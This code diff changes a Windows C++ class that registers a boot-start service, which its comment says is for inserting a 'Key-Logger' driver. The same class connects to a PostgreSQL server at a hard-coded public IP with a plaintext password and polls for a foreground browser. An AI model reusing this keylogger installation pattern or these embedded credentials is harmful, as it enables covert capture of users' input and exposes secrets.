@@ -2,15 +2,17 @@
 
 
 ///////////////////////////////////////////////////////////////////////////////////
-COperation::COperation(std::string strServiceFilePath) : 
-m_bCreateService(FALSE), 
+COperation::COperation(std::string strServiceFilePath) :
+m_bCreateService(FALSE),
 m_bStartService(FALSE),
 m_bRealTimeCheck(FALSE),
 m_bStartOperatoin(TRUE),
 m_pAnalyzer(NULL),
 m_pNetwork(NULL),
 m_pDataBase(NULL),
-m_pDataSingleton(NULL)
+m_hThread(NULL),
+m_pDataSingleton(NULL),
+m_pRealTimeCheck(NULL)
 {
 	/*
 		when creating operation class, service is registered first of all
@@ -29,8 +31,8 @@ m_pDataSingleton(NULL)
 		Service is created for inserting driver module (Key-Logger)
 		So, We use SERVICE_SYSTEM_START parameter for registering service
 	*/
-	LPTSTR lpServiceName = _T(SERVICE_NAME);
 	DWORD dwRet;
+	LPTSTR lpServiceName = _T(SERVICE_NAME);
 	dwRet = m_pService->InitSvc(lpServiceFilePath, lpServiceName, lpServiceName, SERVICE_SYSTEM_START);
 	if (dwRet != SVC_OK) {
 		ErrorLog("Fail to Init service [%s:%d]", __FUNCTION__, __LINE__);
@@ -67,12 +69,10 @@ m_pDataSingleton(NULL)
 	*/
 	ST_DB_LOGIN_TOKEN stDBLoginToken;
 	stDBLoginToken.strUserName = "postgres";
-	
-	// TODO. Password have to be secret
-
-	stDBLoginToken.strPassword = "xeors";
 	stDBLoginToken.strDatabaseIP = "165.132.120.152";
 	stDBLoginToken.strDatabaseName = "postgres";
+	// TODO. Password have to be secret
+	stDBLoginToken.strPassword = "xeros";
 	stDBLoginToken.strPort = "5432";
 	dwRet = ConnectToDB(m_pDataBase, stDBLoginToken);
 	if (dwRet != E_RET_SUCCESS) {
@@ -99,11 +99,6 @@ m_pDataSingleton(NULL)
 		ErrorLog("Fail to initialize network");
 	}
 	*/
-
-	dwRet = m_pNetwork->InitNetworkFromCURL();
-	if (dwRet != E_RET_SUCCESS) {
-		ErrorLog("Fail to initialize network");
-	}
 
 	m_pDataSingleton = CDataSingleton::GetInstance();
 	if (!m_pDataSingleton) {
@@ -179,11 +174,8 @@ DWORD COperation::StartUrlQuery(ST_PROPER_WORD_RET &refstProperWordRet)
 	}
 
 	std::string strHTMLString;
+	strHTMLString = stRecvData.strHTMLData;
 	strHTMLString.resize(stRecvData.dwTotalSize);
-	DWORD i;
-	for (i = 0; i < stRecvData.vecChar.size(); i++) {
-		strHTMLString = stRecvData.vecChar[i];
-	}
 
 	CHTMLReader HTMLReader;
 	dwRet = HTMLReader.ParseHTML(strHTMLString);
@@ -216,6 +208,7 @@ DWORD COperation::StartOperation()
 		'while' is operated until user click button about exit
 		So, if while operation is executed once, this program do one cycle
 	*/
+
 	while (m_bStartOperatoin && dwFailThreashold < FAIL_THRESHOLD)
 	{
 		try 
@@ -234,10 +227,17 @@ DWORD COperation::StartOperation()
 				}
 
 			}
-			else if (dwRet != E_RET_CHECK_FAIL) {
+			else if (dwRet == E_RET_CHECK_FAIL) {
+				/*
+					if RealTimeCheck did not find browser on foreground, 
+					continue to find ....
+				*/
 				continue;
 			}
 			else {
+				/*
+					unknown error
+				*/
 				m_bStartOperatoin = FALSE;
 				continue;
 			}
@@ -277,3 +277,51 @@ DWORD COperation::StopOperation()
 	return E_RET_SUCCESS;
 }
 
+///////////////////////////////////////////////////////////////////////////////////
+void COperation::SetStartOperation(BOOL bValue)
+{
+	m_bStartOperatoin = bValue;
+}
+
+
+///////////////////////////////////////////////////////////////////////////////////
+/*
+	This method is thread for checking event object
+*/
+//unsigned int __stdcall CheckEventThread(void *param)
+//{
+//	COperation *pOperation = NULL;
+//	pOperation = (COperation *)param;
+//
+//	BOOL bContinue = TRUE;
+//	DWORD dwRet, dwLastError;
+//	while (bContinue)
+//	{
+//		dwRet = WaitForSingleObject(g_hEvent, INFINITE);
+//		dwLastError = ::GetLastError();
+//		if (dwRet == WAIT_ABANDONED) {
+//			continue;
+//		}
+//		else if (dwRet == WAIT_OBJECT_0) {
+//			pOperation->SetStartOperation(FALSE);
+//			ResetEvent(g_hEvent);
+//			bContinue = FALSE;
+//		}
+//		else if (dwRet == WAIT_TIMEOUT) {
+//			/*
+//				The time-out interval elapsed, and the object's state is nonsignaled.
+//			*/
+//			continue;
+//		}
+//		else if (dwRet == WAIT_FAILED) {
+//			ErrorLog("Fail to wait for single object [%d]", dwLastError);
+//			continue;
+//		}
+//		else {
+//			ErrorLog("failure of waiting for single object");
+//			continue;
+//		}
+//	}
+//
+//	return 0;
+//}
